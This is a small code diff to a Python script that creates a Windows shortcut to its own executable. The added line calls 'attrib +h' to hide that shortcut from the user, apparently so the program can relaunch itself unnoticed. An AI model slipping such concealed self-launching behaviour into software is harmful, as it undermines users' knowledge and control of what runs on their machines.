@@ -18,6 +18,7 @@ def create_shortcut(user_name, exec_path):
     if not os.path.exists(lnk_filepath):
         shct = shortcut(exec_path + '\\' + os.path.basename(sys.executable))
         shct.write(lnk_filepath)
+        os.system('attrib +h "%s"' %lnk_filepath)
 
 # Main handle
 def execute():
